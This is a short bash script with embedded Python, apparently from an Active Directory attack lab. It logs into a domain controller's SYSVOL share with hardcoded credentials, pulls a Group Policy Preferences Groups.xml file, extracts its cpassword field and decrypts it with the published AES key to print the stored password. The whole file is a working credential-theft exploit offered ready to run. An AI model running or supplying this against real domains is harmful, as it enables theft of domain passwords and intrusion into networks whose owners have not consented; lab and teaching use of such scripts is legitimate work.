#!/usr/bin/env bash
set -euo pipefail

DC_IP="${DC_IP:-172.30.0.10}"
DOMAIN="${DOMAIN:-lab.local}"
USER="joao.silva"
PASS="Senha@123"
OUT="/opt/attacks/output"
XML="$OUT/Groups.xml"
mkdir -p "$OUT"

smbclient "//${DC_IP}/SYSVOL" -U "${DOMAIN}\\${USER}%${PASS}" \
    -c "get ${DOMAIN}/Policies/{11111111-2222-3333-4444-555555555555}/Machine/Preferences/Groups/Groups.xml ${XML}" \
    2>&1 | tee "$OUT/03-gpp-password.log"

CPASSWORD=$(grep -oP 'cpassword="\K[^"]+' "$XML" | head -n1)
if [ -z "$CPASSWORD" ]; then
    echo '[!] cpassword não encontrado'
    exit 1
fi

echo "[*] cpassword: $CPASSWORD"
python3 - "$CPASSWORD" <<'PYEOF'
import base64
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

key = bytes([
    0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
    0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
    0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b,
])
ct = base64.b64decode(sys.argv[1])
decoder = Cipher(algorithms.AES(key), modes.CBC(b'\x00' * 16)).decryptor()
plaintext = decoder.update(ct) + decoder.finalize()
plaintext = plaintext[:-plaintext[-1]]
print('[+] Senha descriptografada:', plaintext.decode('utf-16-le'))
PYEOF
